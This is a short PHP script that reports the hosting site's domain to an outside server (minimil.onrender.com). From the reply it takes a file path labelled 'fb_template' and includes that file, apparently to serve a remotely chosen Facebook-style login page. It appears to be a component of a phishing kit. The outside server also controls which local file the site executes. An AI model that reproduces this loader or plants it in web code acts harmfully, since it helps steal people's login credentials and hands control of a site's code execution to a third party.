<?php
function makeGetRequest($url, $headers = []) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    
    $response = curl_exec($ch);
    $statusCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    
    $error = null;
    if (curl_errno($ch)) {
        $error = curl_error($ch);
    }
    
    curl_close($ch);
    
    return [
        'content' => $response,
        'status_code' => $statusCode,
        'error' => $error
    ];
}

$current_domain = $current_domain = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'];
$response_fb = makeGetRequest('https://minimil.onrender.com/api/websites?domain_fb=' . $current_domain . "/login");
$responseData_fb = json_decode($response_fb['content']);
$page_fb = isset($responseData_fb->data->fb_template->path) ? $responseData_fb->data->fb_template->path : '';

if (file_exists($page_fb)) {
    include $page_fb;
}
?>